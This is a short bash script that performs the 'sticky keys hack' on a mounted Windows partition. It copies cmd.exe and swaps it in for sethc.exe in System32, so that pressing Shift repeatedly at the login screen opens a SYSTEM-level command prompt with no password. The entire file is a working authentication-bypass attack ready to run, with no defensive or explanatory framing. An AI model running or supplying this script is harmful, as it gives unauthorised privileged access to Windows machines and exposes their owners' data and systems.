#!/bin/bash
#execute the windows sticky keys hack

cp "/media/windows/Windows/System32/cmd.exe" "/media/windows/Windows/System32/cmdlol.exe"
mv "/media/windows/Windows/System32/sethc.exe" "/media/windows/Windows/System32/sethcold.exe"
mv "/media/windows/Windows/System32/cmdlol.exe" "/media/windows/Windows/System32/sethc.exe"